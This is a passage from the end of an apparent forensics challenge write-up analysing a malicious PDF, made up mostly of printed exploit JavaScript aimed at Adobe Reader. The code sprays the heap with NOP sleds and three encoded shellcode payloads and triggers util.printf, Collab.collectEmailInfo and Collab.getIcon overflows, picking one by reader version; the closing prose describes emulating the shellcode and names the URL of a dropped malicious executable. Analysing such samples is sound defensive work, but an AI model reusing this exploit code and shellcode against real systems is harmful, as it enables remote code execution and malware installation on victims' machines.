</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">jY</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">while</span> <span class="p">(</span><span class="nx">bigblock</span><span class="p">.</span><span class="nx">length</span> <span class="o">&lt;</span> <span class="nx">spray</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">this</span><span class="p">.</span><span class="nx">r</span> <span class="o">=</span> <span class="s2">&#34;r&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nx">bigblock</span> <span class="o">+=</span> <span class="nx">bigblock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="kd">var</span> <span class="nx">edit</span> <span class="o">=</span> <span class="s2">&#34;edit&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="k">this</span><span class="p">.</span><span class="nx">xGoogle</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">this</span><span class="p">.</span><span class="nx">vY</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">fillblock</span> <span class="o">=</span> <span class="nx">bigblock</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">spray</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">iP</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{};</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">block</span> <span class="o">=</span> <span class="nx">bigblock</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">bigblock</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="nx">spray</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">googleD</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">this</span><span class="p">.</span><span class="nx">fUEdit</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">while</span> <span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">length</span> <span class="o">+</span> <span class="nx">spray</span> <span class="o">&lt;</span> <span class="mh">0x40000</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">block</span> <span class="o">=</span> <span class="nx">block</span> <span class="o">+</span> <span class="nx">block</span> <span class="o">+</span> <span class="nx">fillblock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">this</span><span class="p">.</span><span class="nx">bJ</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">googleQ</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">this</span><span class="p">.</span><span class="nx">nW</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">mem_array</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">cH</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">String</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">nVO</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">String</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1400</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">mem_array</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">block</span> <span class="o">+</span> <span class="nx">heapblock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="kd">var</span> <span class="nx">sQ</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">String</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">wC</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">num</span> <span class="o">=</span> <span class="mi">12999999999999999999888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">this</span><span class="p">.</span><span class="nx">bC</span> <span class="o">=</span> <span class="mi">3699</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nx">util</span><span class="p">.</span><span class="nx">printf</span><span class="p">(</span><span class="s2">&#34;%45000f&#34;</span><span class="p">,</span> <span class="nx">num</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">eQ</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">gX</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">basicZ</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// notepad.exe payload
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kd">var</span> <span class="nx">shellcode</span> <span class="o">=</span> <span class="nx">unescape</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">		<span class="s2">&#34;%uc931%u64b1%ub6bf%u558b%ud976%ud9cd%u2474%u58f4%ue883%u31fc%u0d78%u7803%ue20d%u6043%u2c45%u44e1%ub6af%u964c%ub72e%ued9a%u55a9%u1a18%u71cc%u2237%u7e30%u91b7%u1856%ue9ae%u2394%u7479%ucdff%u5e6b%ufc95%ue562%u12a2%u77ad%u53d8%u925f%u4178%ue5b2%ufc62%uf826%ub883%u9e2c%u6c59%uf5dd%u5d2a%uc113%uc7c1%ub031%u6cf7%ua2b6%u1838%u2007%u1d29%ua0b1%u0314%uaee1%ufbd8%u96df%ua80b%uc7cd%uca91%ubfab%u7091%uea13%u7a32%u7bb1%u5ba0%ue130%u3b9f%u8d42%ue4ba%u28a0%u4e20%u29d6%u0147%uf2cc%ucff0%uffb9%u2f62%uc948%u2904%ud333%ude69%u2b88%u10f3%u776b%uedee%uef80%u9fcf%u89c2%uc649%uf510%u36e3%u10fb%ud153%u40ef%u4d82%u41f6%ue4ae%u5cb1%uf58a%uaa78%u3472%u750f%u52e6%u712a%u9faf%u5fea%uc24a%u9cf3%u64f2%u0559%u5ecc%u7957%u0607%ue3a9%u828a%u26fc%uc2cc%u7f97%u1577%u2a0a%u9c21%u73c8%ube3e%u4838%uf571%u04de%uca4d%ue02c%u6126%u4c09%ucab8%u16cf%ueb5c%u3af3%uf869%u3ffd%u02b2%u2bfc%u17bf%u3214%u149e%u8f05%u0fff%uec38%u0df4%ue632%u5709%u0f5f%u481a%u6947%u7913%u5680%u864d%ufe94%u9652%uec98%ua8a6%u13b3%ub6c0%u39da%ub1c7%u1421%ub9d8%u6f32%udef2%u091c%uf4e9%ude69%ufd04%ud308%ud722%u1af7%u2f5a%u15f2%u2d5b%u2f31%u3e43%u2c3c%u26a4%ub9d6%u2921%u6d1c%uabe5%u1e0c%u059e%u8fa4%u3f0e%u3e4d%ucbaa%ud183%u5346%u40f5%ub4de%uf46f%uae52%u7901%u53fa%u1e82%uf294%u8d50%u9b01%u28cf%u50e5%ud262%ue195%u661d%u2003%ufeb8%ubcae&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">mem_array</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="k">this</span><span class="p">.</span><span class="nx">googleBasicR</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">cc</span> <span class="o">=</span> <span class="mh">0x0c0c0c0c</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">addr</span> <span class="o">=</span> <span class="mh">0x400000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">sc_len</span> <span class="o">=</span> <span class="nx">shellcode</span><span class="p">.</span><span class="nx">length</span> <span class="o">*</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">len</span> <span class="o">=</span> <span class="nx">addr</span> <span class="o">-</span> <span class="p">(</span><span class="nx">sc_len</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">yarsp</span> <span class="o">=</span> <span class="nx">unescape</span><span class="p">(</span><span class="s2">&#34;%u9090%u9090&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">this</span><span class="p">.</span><span class="nx">eS</span> <span class="o">=</span> <span class="s2">&#34;eS&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nx">yarsp</span> <span class="o">=</span> <span class="nx">s</span><span class="p">(</span><span class="nx">yarsp</span><span class="p">,</span> <span class="nx">len</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">count2</span> <span class="o">=</span> <span class="p">(</span><span class="nx">cc</span> <span class="o">-</span> <span class="mh">0x400000</span><span class="p">)</span> <span class="o">/</span> <span class="nx">addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">this</span><span class="p">.</span><span class="nx">rF</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">this</span><span class="p">.</span><span class="nx">p</span> <span class="o">=</span> <span class="s2">&#34;p&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">count</span> <span class="o">&lt;</span> <span class="nx">count2</span><span class="p">;</span> <span class="nx">count</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">mem_array</span><span class="p">[</span><span class="nx">count</span><span class="p">]</span> <span class="o">=</span> <span class="nx">yarsp</span> <span class="o">+</span> <span class="nx">shellcode</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">bUpdate</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">String</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">overflow</span> <span class="o">=</span> <span class="nx">unescape</span><span class="p">(</span><span class="s2">&#34;%u0c0c%u0c0c&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">cP</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{};</span>
</span></span><span class="line"><span class="cl">	<span class="k">this</span><span class="p">.</span><span class="nx">gD</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">while</span> <span class="p">(</span><span class="nx">overflow</span><span class="p">.</span><span class="nx">length</span> <span class="o">&lt;</span> <span class="mi">44952</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">this</span><span class="p">.</span><span class="nx">tO</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nx">overflow</span> <span class="o">+=</span> <span class="nx">overflow</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">adobeD</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">String</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="k">this</span><span class="p">.</span><span class="nx">collabStore</span> <span class="o">=</span> <span class="nx">Collab</span><span class="p">.</span><span class="nx">collectEmailInfo</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">		<span class="nx">subj</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nx">msg</span><span class="o">:</span> <span class="nx">overflow</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">updateE</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">xI</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">String</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">doc</span><span class="p">.</span><span class="nx">Collab</span><span class="p">.</span><span class="nx">getIcon</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="kd">var</span> <span class="nx">arry</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">		<span class="c1">// cmd.exe payload
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="kd">var</span> <span class="nx">vvpethya</span> <span class="o">=</span> <span class="nx">unescape</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">			<span class="s2">&#34;%ud3b8%u7458%ud901%u2bcb%ud9c9%u2474%ub1f4%u5a65%u4231%u0312%u1242%u3983%u96a4%u56f4%u0d45%u9bbd%ud7af%ue7f8%u982e%u1dcf%u7aa8%ucad5%u92cf%uf3c1%u9d2f%u4766%ufb49%u941e%uc494%u8389%uacfe%u6ad8%udd95%u0935%uf3a2%u801c%ub2d9%u488c%u2678%u0b5c%udd62%u01f4%u5b82%u4792%u4b5e%u2d2e%ubc2a%uf9ff%ue4c1%u9b9a%u83f7%ucc69%u3938%u1fb1%u7e29%uc50b%ue214%u8248%udcd8%ub3b7%u890b%ue425%uab91%u5210%u5192%uc8fc%u9932%u9def%ubaa1%u0795%u1c9f%uacee%uc5ba%u4b1c%uaf20%u0832%u3e47%u9129%uacf0%ude04%u1062%ue9e7%u0804%uf391%ubf69%ucc69%u71f0%u1108%uccee%u0d20%ubecf%ub462%ud949%u9971%u15e3%u3c5a%ub053%u5d89%u6c82%u6648%u07ae%u7ad2%u148a%ub09d%u1572%u1aab%u33e6%u5a91%ub8af%u4744%udd4a%u8b98%u47f2%u2af0%ub1cc%u03cf%u2707%ufe1e%ued8a%uca57%u23cd%u030e%u7277%u39bc%ubf21%u6423%udf3e%u5d93%uea71%u2a42%u2b4d%ud7b8%u0626%u7de4%ue9b8%ue771%uc85c%u0a82%u1f69%u2e8c%u1db2%u258c%u34bf%u2085%u359e%u98b7%u2cff%ue0a5%u6cf4%uf3c6%u7409%uf5ca%u6919%u60cd%u9a13%u4e19%ua74d%uf71c%ub952%uea11%ucba6%u0839%ud1c0%u2527%ud2c7%u10a5%ud8d8%u62bd%ufff2%u0b9a%uebe9%udfee%u1c04%ud389%u3622%u1d77%u4e5a%u177d%u4c5b%u21b3%u5f43%u31b9%u39a4%ubd2a%u4a21%u1291%uc8e5%u0389%u229e%ub43a%u5e0e%u24c3%ud4aa%ud71d%u7246%u4a4c%u53de%ufbf6%uc952%u7098%u72fa%u153a%u1594%ub5a8%ub801%u2057%u29e5%uc6f9%ud08e%u738b%u275f%u1e42%u22e7%u411a&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="kd">var</span> <span class="nx">updateX</span> <span class="o">=</span> <span class="mi">39796</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="kd">var</span> <span class="nx">hWq500CN</span> <span class="o">=</span> <span class="nx">vvpethya</span><span class="p">.</span><span class="nx">length</span> <span class="o">*</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="kd">var</span> <span class="nx">len</span> <span class="o">=</span> <span class="mh">0x400000</span> <span class="o">-</span> <span class="p">(</span><span class="nx">hWq500CN</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="kd">var</span> <span class="nx">zAdobe</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="kd">var</span> <span class="nx">yarsp</span> <span class="o">=</span> <span class="nx">unescape</span><span class="p">(</span><span class="s2">&#34;%u9090%u9090&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="kd">var</span> <span class="nx">dU</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nx">yarsp</span> <span class="o">=</span> <span class="nx">s</span><span class="p">(</span><span class="nx">yarsp</span><span class="p">,</span> <span class="nx">len</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">this</span><span class="p">.</span><span class="nx">zAdobeK</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="kd">var</span> <span class="nx">p5AjK65f</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x0c0c0c0c</span> <span class="o">-</span> <span class="mh">0x400000</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x400000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="kd">var</span> <span class="nx">aG</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">		<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">vqcQD96y</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">vqcQD96y</span> <span class="o">&lt;</span> <span class="nx">p5AjK65f</span><span class="p">;</span> <span class="nx">vqcQD96y</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="kd">var</span> <span class="nx">lBasic</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="nx">arry</span><span class="p">[</span><span class="nx">vqcQD96y</span><span class="p">]</span> <span class="o">=</span> <span class="nx">yarsp</span> <span class="o">+</span> <span class="nx">vvpethya</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="kd">var</span> <span class="nx">u</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="kd">var</span> <span class="nx">iAlpha</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{};</span>
</span></span><span class="line"><span class="cl">		<span class="kd">var</span> <span class="nx">tUMhNbGw</span> <span class="o">=</span> <span class="nx">unescape</span><span class="p">(</span><span class="s2">&#34;%09&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">while</span> <span class="p">(</span><span class="nx">tUMhNbGw</span><span class="p">.</span><span class="nx">length</span> <span class="o">&lt;</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="k">this</span><span class="p">.</span><span class="nx">gN</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="nx">tUMhNbGw</span> <span class="o">+=</span> <span class="nx">tUMhNbGw</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="kd">var</span> <span class="nx">hV</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">String</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="kd">var</span> <span class="nx">nVE</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{};</span>
</span></span><span class="line"><span class="cl">		<span class="nx">tUMhNbGw</span> <span class="o">=</span> <span class="s2">&#34;N.&#34;</span> <span class="o">+</span> <span class="nx">tUMhNbGw</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nx">c</span><span class="p">.</span><span class="nx">doc</span><span class="p">.</span><span class="nx">Collab</span><span class="p">.</span><span class="nx">getIcon</span><span class="p">(</span><span class="nx">tUMhNbGw</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="k">this</span><span class="p">.</span><span class="nx">wZ</span> <span class="o">=</span> <span class="mi">44811</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">hO</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">String</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">nO</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">this</span><span class="p">.</span><span class="nx">iR</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">version</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">viewerVersion</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">zH</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nx">version</span> <span class="o">=</span> <span class="nx">version</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/D/g</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">varsion_array</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">		<span class="nx">version</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">		<span class="nx">version</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">		<span class="nx">version</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">		<span class="p">(</span><span class="nx">varsion_array</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">8</span> <span class="o">&amp;&amp;</span> <span class="nx">varsion_array</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">		<span class="p">(</span><span class="nx">varsion_array</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nx">varsion_array</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">cN</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="k">this</span><span class="p">.</span><span class="nx">wN</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">aQ</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">String</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">		<span class="nx">varsion_array</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">8</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">		<span class="p">(</span><span class="nx">varsion_array</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">8</span> <span class="o">&amp;&amp;</span> <span class="nx">varsion_array</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">2</span> <span class="o">&amp;&amp;</span> <span class="nx">varsion_array</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">gX</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">vEdit</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nx">varsion_array</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">9</span> <span class="o">||</span> <span class="p">(</span><span class="nx">varsion_array</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">9</span> <span class="o">&amp;&amp;</span> <span class="nx">varsion_array</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">updateE</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">eH</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{};</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">eSJ</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Function</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="nx">cG</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">vUpdate</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">basicU</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">this</span><span class="p">.</span><span class="nx">updateO</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">nO</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">mUpdate</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{};</span>
</span></span></code></pre></div><h2 id="9-the-js-code-responsible-for-executing-the-exploit-contains-shellcodes-that-drop-malicious-executable-files-what-is-the-full-path-of-malicious-executable-files-after-being-dropped-by-the-malware-on-the-victim-machine">9. The JS code responsible for executing the exploit contains shellcodes that drop malicious executable files. What is the full path of malicious executable files after being dropped by the malware on the victim machine?</h2>
<p>After analyzing the above code I found the the code is calling nO() function. And based on adobe acrobat readers version cN(), gX() and updateE() is called.
Each of the 3 function has different shellcode. So I copy the shellcode modified it using <a href="https://cyberchef.org/#recipe=Find_/_Replace(%7B'option':'Regex','string':'%25u'%7D,'%20',true,false,true,false)From_Hex('Auto')">this</a> recipe. Then emulate it using scdbg.</p>
<p><img src="https://i.imgur.com/8DCnkI9.png" alt=""></p>
<h2 id="10-the-pdf-file-contains-another-exploit-related-to-cve-2010-0188-what-is-the-url-of-the-malicious-executable-that-the-shellcode-associated-with-this-exploit-drop">10. The PDF file contains another exploit related to CVE-2010-0188. What is the URL of the malicious executable that the shellcode associated with this exploit drop?</h2>
<p>Then I did the for all shell code. Every shellcode gave me different URL. But none of the was correct answer. Then I used the one what i got from the pcap.</p>
<pre tabindex="0"><code>http://blog.honeynet.org.my/forensic_challenge/the_real_malware.exe
